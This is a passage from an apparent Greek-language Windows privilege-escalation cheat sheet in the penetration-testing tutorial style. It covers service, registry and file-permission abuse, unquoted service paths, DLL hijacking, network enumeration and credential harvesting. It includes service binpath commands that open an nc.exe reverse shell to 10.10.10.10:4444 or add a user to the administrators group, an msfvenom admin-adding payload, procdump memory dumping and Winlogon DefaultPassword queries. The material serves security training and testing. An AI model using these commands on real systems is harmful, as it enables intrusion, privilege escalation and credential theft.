{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Επεξεργασία διακριτικού

Μάθετε περισσότερα για το τι είναι ένα διακριτικό σε αυτήν τη σελίδα: [Windows Tokens](../authentication-credentials-uac-and-efs.md#access-tokens).\
Ελέγξτε την παρακάτω σελίδα για να μάθετε περισσότερα για ενδιαφέροντα διακριτικά και πώς να τα καταχραστείτε:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Συνδεδεμένοι χρήστες / Συνεδρίες
```bash
qwinsta
klist sessions
```
### Φάκελοι Αρχικής Σελίδας

Οι φάκελοι Αρχικής Σελίδας αναφέρονται στους φακέλους που δημιουργούνται για κάθε χρήστη σε ένα σύστημα Windows. Αυτοί οι φάκελοι περιέχουν τα προσωπικά αρχεία και τις ρυθμίσεις του κάθε χρήστη. Οι φάκελοι Αρχικής Σελίδας βρίσκονται συνήθως στη διαδρομή `C:\Users\` και ονομάζονται με το όνομα του αντίστοιχου χρήστη.

Οι φάκελοι Αρχικής Σελίδας περιέχουν σημαντικές πληροφορίες για τον χρήστη, όπως τα έγγραφα, τις εικόνες, τα αρχεία μουσικής και τα αρχεία βίντεο του. Επίσης, περιέχουν τις ρυθμίσεις του περιβάλλοντος εργασίας του χρήστη, όπως τα αρχεία διαμόρφωσης του γραφικού περιβάλλοντος, τα αρχεία ρυθμίσεων του περιηγητή ιστού και τα αρχεία ρυθμίσεων των εφαρμογών.

Για έναν χάκερ, οι φάκελοι Αρχικής Σελίδας μπορούν να αποτελέσουν σημαντική πηγή πληροφοριών και ευπάθεια για εκμετάλλευση. Με την απόκτηση πρόσβασης σε αυτούς τους φακέλους, ο χάκερ μπορεί να ανακτήσει ευαίσθητα δεδομένα, να τροποποιήσει ρυθμίσεις χρήστη ή ακόμη και να εκτελέσει κακόβουλο κώδικα στο περιβάλλον του χρήστη.
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική Κωδικών Πρόσβασης

Η πολιτική κωδικών πρόσβασης είναι ένα σημαντικό μέτρο ασφαλείας που μπορεί να εφαρμοστεί σε ένα σύστημα για να προστατεύσει τους λογαριασμούς χρηστών από ανεπιθύμητη πρόσβαση. Η πολιτική κωδικών πρόσβασης ορίζει τις απαιτήσεις για τον τύπο και την πολυπλοκότητα των κωδικών πρόσβασης που πρέπει να χρησιμοποιούν οι χρήστες.

Οι παρακάτω πρακτικές αποτελούν κοινές απαιτήσεις για μια αποτελεσματική πολιτική κωδικών πρόσβασης:

- Ελάχιστος αριθμός χαρακτήρων: Ορίζει τον ελάχιστο αριθμό χαρακτήρων που πρέπει να έχει ένας κωδικός πρόσβασης.
- Πολυπλοκότητα: Απαιτεί τη χρήση διαφόρων τύπων χαρακτήρων, όπως κεφαλαία γράμματα, πεζά γράμματα, αριθμούς και ειδικούς χαρακτήρες.
- Αλλαγή κωδικού πρόσβασης: Απαιτεί την τακτική αλλαγή του κωδικού πρόσβασης σε συγκεκριμένα χρονικά διαστήματα.
- Απαγόρευση επαναχρησιμοποίησης: Απαγορεύει την επαναχρησιμοποίηση προηγούμενων κωδικών πρόσβασης.
- Κλείδωμα λογαριασμού: Αυτόματο κλείδωμα του λογαριασμού μετά από έναν ορισμένο αριθμό αποτυχημένων προσπαθειών σύνδεσης.

Μια ισχυρή πολιτική κωδικών πρόσβασης μπορεί να βοηθήσει στην προστασία των λογαριασμών χρηστών από επιθέσεις εκμετάλλευσης και ανεπιθύμητη πρόσβαση.
```bash
net accounts
```
### Λήψη του περιεχομένου του πρόχειρου

Για να αποκτήσετε το περιεχόμενο του πρόχειρου σε ένα σύστημα Windows, μπορείτε να χρησιμοποιήσετε την ακόλουθη τεχνική:

1. Χρησιμοποιήστε την εντολή `powershell.exe` για να ανοίξετε ένα νέο παράθυρο PowerShell.
2. Εκτελέστε την εντολή `Get-Clipboard` για να αντιγράψετε το περιεχόμενο του πρόχειρου στην κονσόλα PowerShell.
3. Το περιεχόμενο του πρόχειρου θα εμφανιστεί στην οθόνη.

Με αυτόν τον τρόπο, μπορείτε να αποκτήσετε πρόσβαση στο περιεχόμενο που έχει αντιγραφεί στο πρόχειρο σε ένα σύστημα Windows.
```bash
powershell -command "Get-Clipboard"
```
## Εκτέλεση Διεργασιών

### Δικαιώματα Αρχείων και Φακέλων

Καταρχήν, καταλογίζοντας τις διεργασίες, **ελέγξτε για κωδικούς πρόσβασης μέσα στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε εάν μπορείτε να **αντικαταστήσετε κάποιο εκτελέσιμο που εκτελείται** ή εάν έχετε δικαιώματα εγγραφής στον φάκελο του εκτελέσιμου για εκμετάλλευση πιθανών επιθέσεων [**DLL Hijacking**](dll-hijacking.md):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Πάντα ελέγχετε για πιθανούς [**αποσφαλματωτές electron/cef/chromium** που εκτελούνται, μπορείτε να τους καταχραστείτε για να αναβαθμίσετε τα δικαιώματα](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος των δικαιωμάτων των δυαδικών αρχείων των διεργασιών**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των δυαδικών αρχείων των διεργασιών (DLL Hijacking)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Εξόρυξη Κωδικών Πρόσβασης από τη Μνήμη

Μπορείτε να δημιουργήσετε ένα αντίγραφο της μνήμης ενός εκτελούμενου διεργασίας χρησιμοποιώντας το **procdump** από το sysinternals. Υπηρεσίες όπως η FTP έχουν τα **διαπιστευτήρια σε καθαρό κείμενο στη μνήμη**, προσπαθήστε να αντιγράψετε τη μνήμη και να διαβάσετε τα διαπιστευτήρια.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Ευάλωτες εφαρμογές με γραφικό περιβάλλον

**Οι εφαρμογές που εκτελούνται ως SYSTEM μπορεί να επιτρέπουν σε έναν χρήστη να εκκινήσει ένα CMD ή να περιηγηθεί σε φακέλους.**

Παράδειγμα: "Βοήθεια και υποστήριξη των Windows" (Windows + F1), αναζήτηση για "command prompt", κάντε κλικ στο "Κλικ για να ανοίξετε το Command Prompt"

## Υπηρεσίες

Λήψη λίστας υπηρεσιών:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε την εντολή **sc** για να λάβετε πληροφορίες για ένα υπηρεσία.
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το δυαδικό αρχείο **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομιακών δικαιωμάτων για κάθε υπηρεσία.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε εάν οι "Εξουσιοδοτημένοι Χρήστες" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Μπορείτε να κατεβάσετε το accesschk.exe για τα XP εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Εάν αντιμετωπίζετε αυτό το σφάλμα (για παράδειγμα με το SSDPSRV):

_Συστημικό σφάλμα 1058 έχει συμβεί._\
_Η υπηρεσία δεν μπορεί να ξεκινήσει, είτε επειδή είναι απενεργοποιημένη είτε επειδή δεν έχει καμία ενεργοποιημένη συσκευή που σχετίζεται με αυτήν._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας την εντολή
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για το XP SP1)**

**Ένας άλλος τρόπος αντιμετώπισης** αυτού του προβλήματος είναι να εκτελέσετε:
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση της διαδρομής του εκτελέσιμου αρχείου της υπηρεσίας**

Στην περίπτωση όπου η ομάδα "Εξουσιοδοτημένοι χρήστες" έχει τα δικαιώματα **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας

Για να επανεκκινήσετε μια υπηρεσία σε ένα σύστημα Windows, μπορείτε να ακολουθήσετε τα παρακάτω βήματα:

1. Ανοίξτε το Command Prompt (Εντολέας) ως διαχειριστής.
2. Πληκτρολογήστε την εντολή `net stop [όνομα_υπηρεσίας]` για να σταματήσετε την υπηρεσία. Αντικαταστήστε το `[όνομα_υπηρεσίας]` με το πραγματικό όνομα της υπηρεσίας που θέλετε να επανεκκινήσετε.
3. Πληκτρολογήστε την εντολή `net start [όνομα_υπηρεσίας]` για να ξεκινήσετε ξανά την υπηρεσία. Αντικαταστήστε το `[όνομα_υπηρεσίας]` με το πραγματικό όνομα της υπηρεσίας που θέλετε να επανεκκινήσετε.

Αυτή η διαδικασία θα επανεκκινήσει την επιλεγμένη υπηρεσία στο σύστημα Windows.
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Οι προνομιούχοι μπορούν να αναβαθμιστούν μέσω διάφορων δικαιωμάτων:
- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την αναδιαμόρφωση του δυαδικού αρχείου της υπηρεσίας.
- **WRITE_DAC**: Επιτρέπει την αναδιαμόρφωση των δικαιωμάτων, οδηγώντας στη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ιδιοκτησίας και την αναδιαμόρφωση των δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **GENERIC_ALL**: Κληρονομεί επίσης τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα δικαιώματα δυαδικών υπηρεσιών

**Ελέγξτε εάν μπορείτε να τροποποιήσετε το δυαδικό αρχείο που εκτελείται από μια υπηρεσία** ή εάν έχετε **δικαιώματα εγγραφής στον φάκελο** όπου βρίσκεται το δυαδικό αρχείο ([**DLL Hijacking**](dll-hijacking.md))**.**\
Μπορείτε να λάβετε κάθε δυαδικό αρχείο που εκτελείται από μια υπηρεσία χρησιμοποιώντας το **wmic** (όχι στο system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας το **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε τις εντολές **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Δικαιώματα τροποποίησης καταχωρήσεων υπηρεσιών

Θα πρέπει να ελέγξετε εάν μπορείτε να τροποποιήσετε οποιαδήποτε καταχώρηση υπηρεσίας στο μητρώο.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας σε μια καταχώρηση υπηρεσίας κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί εάν οι **Εξουσιοδοτημένοι Χρήστες** ή **NT AUTHORITY\INTERACTIVE** έχουν δικαιώματα `FullControl`. Εάν ισχύει αυτό, μπορεί να τροποποιηθεί το δυαδικό που εκτελείται από την υπηρεσία.

Για να αλλάξετε τη διαδρομή του εκτελούμενου δυαδικού:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Δικαιώματα προσθήκης δεδομένων/υποκαταλόγου στο μητρώο υπηρεσιών

Αν έχετε αυτό το δικαίωμα πάνω σε ένα μητρώο, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε υποκαταλόγους από αυτόν**. Στην περίπτωση των υπηρεσιών των Windows, αυτό είναι **αρκετό για να εκτελέσετε αυθαίρετο κώδικα**:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Μη-περικλειόμενοι διαδρόμοι υπηρεσιών

Αν ο διαδρομός προς ένα εκτελέσιμο αρχείο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τερματισμό πριν από ένα κενό.

Για παράδειγμα, για τον διαδρομό _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Αναφέρετε όλα τα μη-περικλειόμενα μονοπάτια υπηρεσιών, εξαιρουμένων αυτών που ανήκουν σε ενσωματωμένες υπηρεσίες των Windows:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να ανιχνεύσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path`
Μπορείτε να δημιουργήσετε χειροκίνητα ένα δυαδικό αρχείο υπηρεσίας με το metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες Ανάκτησης

Τα Windows επιτρέπουν στους χρήστες να καθορίσουν ποιες ενέργειες θα πραγματοποιηθούν σε περίπτωση αποτυχίας ενός υπηρεσίας. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα δυαδικό αρχείο. Εάν αυτό το δυαδικό αρχείο είναι αντικαταστάσιμο, μπορεί να υπάρξει προνόμια προώθησης. Περισσότερες λεπτομέρειες μπορούν να βρεθούν στην [επίσημη τεκμηρίωση](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Εφαρμογές

### Εγκατεστημένες Εφαρμογές

Ελέγξτε τα **δικαιώματα των δυαδικών αρχείων** (ίσως μπορείτε να αντικαταστήσετε ένα από αυτά και να αναβαθμίσετε τα προνόμια) και των **φακέλων** ([Απάτη με DLL](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα Εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε ένα αρχείο ρύθμισης για να διαβάσετε ένα ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε ένα δυαδικό αρχείο που θα εκτελεστεί από ένα λογαριασμό Διαχειριστή (schedtasks).

Ένας τρόπος για να βρείτε αδύναμα δικαιώματα φακέλου/αρχείου στο σύστημα είναι να κάνετε:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε εάν μπορείτε να αντικαταστήσετε κάποιο καταχωρητή ή δυαδικό αρχείο που θα εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα για ενδιαφέρουσες **τοποθεσίες autoruns για ανέλιξη δικαιωμάτων**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Οδηγοί

Αναζητήστε πιθανούς **τρίτους παράξενους/ευάλωτους** οδηγούς
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Εάν έχετε **δικαιώματα εγγραφής μέσα σε έναν φάκελο που βρίσκεται στο PATH**, μπορείτε να καταφέρετε να αποκτήσετε προνόμια εκτέλεσης ανακατευθύνοντας μια DLL που φορτώνεται από ένα διεργασία.

Ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να καταχραστείτε αυτόν τον έλεγχο:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Δίκτυο

### Κοινόχρηστοι φάκελοι
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### αρχείο hosts

Ελέγξτε για άλλους γνωστούς υπολογιστές που έχουν καταχωρηθεί στατικά στο αρχείο hosts.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS

Οι διεπαφές δικτύου αναφέρονται στις φυσικές ή εικονικές συσκευές που χρησιμοποιούνται για τη σύνδεση ενός υπολογιστή με το δίκτυο. Κάθε διεπαφή δικτύου έχει μια μοναδική διεύθυνση IP που την αναγνωρίζει στο δίκτυο. Οι διεπαφές δικτύου μπορούν να είναι ενσύρματες (π.χ. Ethernet) ή ασύρματες (π.χ. Wi-Fi).

Ο DNS (Domain Name System) είναι ένα σύστημα που μετατρέπει τα ονόματα τομέων σε διευθύνσεις IP. Αντί να χρησιμοποιούμε τις αριθμητικές διευθύνσεις IP για να αποκτήσουμε πρόσβαση σε έναν ιστότοπο, μπορούμε να χρησιμοποιήσουμε το όνομα του τομέα (π.χ. www.example.com). Ο DNS αναλαμβάνει να μεταφράσει αυτό το όνομα τομέα σε μια αντίστοιχη διεύθυνση IP, επιτρέποντάς μας να συνδεθούμε με τον ιστότοπο.

Οι διεπαφές δικτύου και ο DNS είναι σημαντικά στοιχεία για την επικοινωνία και τη σύνδεση ενός υπολογιστή με το δίκτυο και τον ιστό.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές Θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από το εξωτερικό.
```bash
netstat -ano #Opened ports?
```
### Πίνακας Δρομολόγησης

Ο πίνακας δρομολόγησης είναι ένας κατάλογος που χρησιμοποιείται από το λειτουργικό σύστημα για να αποφασίσει ποιος δρομολογητής θα χρησιμοποιηθεί για να μεταβεί από ένα δίκτυο σε ένα άλλο. Ο πίνακας δρομολόγησης περιέχει καταχωρήσεις που αντιστοιχούν διευθύνσεις IP προορισμού με διευθύνσεις IP δικτύου και διεπαφές δρομολογητή. Αυτός ο πίνακας είναι κρίσιμος για τη σωστή λειτουργία του δικτύου και τη δρομολόγηση των πακέτων.

Ο πίνακας δρομολόγησης μπορεί να είναι τοπικός ή απομακρυσμένος. Ο τοπικός πίνακας δρομολόγησης αναφέρεται στον πίνακα που υπάρχει σε ένα μεμονωμένο σύστημα, ενώ ο απομακρυσμένος πίνακας δρομολόγησης αναφέρεται σε έναν πίνακα που υπάρχει σε έναν δρομολογητή ή έναν κεντρικό διακομιστή δρομολόγησης.

Ο πίνακας δρομολόγησης μπορεί να τροποποιηθεί για να επιτρέψει την ανακατεύθυνση της κίνησης δεδομένων μέσω διαφορετικών διεπαφών ή δικτύων. Αυτό μπορεί να χρησιμοποιηθεί για να επιτευχθεί η απόκτηση προνομίων σε ένα σύστημα, καθώς ο κακόβουλος χρήστης μπορεί να αλλάξει τον πίνακα δρομολόγησης για να ανακατευθύνει την κίνηση δεδομένων μέσω ενός ελεγχόμενου από αυτόν δρομολογητή.
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP

Ο πίνακας ARP (Address Resolution Protocol) είναι ένας πίνακας που χρησιμοποιείται στα δίκτυα για την αντιστοίχιση των διευθύνσεων MAC (Media Access Control) με τις αντίστοιχες διευθύνσεις IP. Ο πίνακας ARP αποθηκεύεται στη μνήμη του υπολογιστή και χρησιμοποιείται για την αποστολή πακέτων στο σωστό προορισμό στο επίπεδο δικτύου.

Ο πίνακας ARP περιέχει καταχωρήσεις που αντιστοιχούν μια διεύθυνση IP με μια διεύθυνση MAC. Κάθε καταχώρηση περιλαμβάνει τη διεύθυνση IP και τη διεύθυνση MAC του αντίστοιχου συσκευής. Όταν ένας υπολογιστής χρειάζεται να στείλει ένα πακέτο σε μια συγκεκριμένη διεύθυνση IP, ελέγχει πρώτα τον πίνακα ARP για να βρει την αντίστοιχη διεύθυνση MAC. Αν η καταχώρηση υπάρχει στον πίνακα ARP, τότε ο υπολογιστής μπορεί να στείλει το πακέτο στη σωστή συσκευή. Αν η καταχώρηση δεν υπάρχει, τότε ο υπολογιστής πρέπει να κάνει ένα ARP request για να ανακαλύψει τη διεύθυνση MAC της συσκευής.

Ο πίνακας ARP μπορεί να χρησιμοποιηθεί και από επιτιθέμενους για να εκμεταλλευτούν ευπάθειες στο σύστημα. Με την αλλοίωση του πίνακα ARP, ένας επιτιθέμενος μπορεί να παραπλανήσει τον υπολογιστή και να ανακατευθύνει την κυκλοφορία των πακέτων. Αυτό μπορεί να οδηγήσει σε επιθέσεις όπως το ARP spoofing και το man-in-the-middle. Για να προστατευτείτε από αυτούς τους τύπους επιθέσεων, μπορείτε να εφαρμόσετε μέτρα όπως τον έλεγχο του πίνακα ARP, τη χρήση ασφαλούς ARP και την ενεργοποίηση του ARP inspection.
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Τείχους Προστασίας

[**Ελέγξτε αυτήν τη σελίδα για εντολές σχετικές με το Τείχος Προστασίας**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, ενεργοποίηση...)**

Περισσότερες [εντολές για απαρίθμηση δικτύου εδώ](../basic-cmd-for-pentesters.md#network)

### Υποσύστημα Windows για Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το δυαδικό αρχείο `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Εάν αποκτήσετε δικαιώματα ρίζας, μπορείτε να ακούτε σε οποιαδήποτε θύρα (την πρώτη φορά που χρησιμοποιείτε το `nc.exe` για να ακούσετε σε μια θύρα, θα ζητηθεί μέσω γραφικού περιβάλλοντος εάν το `nc` πρέπει να επιτραπεί από το τείχος προστασίας).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Διαχειριστής διαπιστευτηρίων / Θησαυροφυλάκιο των Windows

Από το [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Θησαυροφυλάκιο των Windows αποθηκεύει τα διαπιστευτήρια χρήστη για διακομιστές, ιστότοπους και άλλα προγράμματα που το **Windows** μπορεί να συνδεθεί αυτόματα με τους χρήστες. Αρχικά, αυτό μπορεί να φαίνεται ότι οι χρήστες μπορούν να αποθηκεύσουν τα διαπιστευτήρια τους για το Facebook, το Twitter, το Gmail κ.λπ., ώστε να συνδέονται αυτόματα μέσω των προγραμμάτων περιήγησης. Αλλά δεν είναι έτσι.

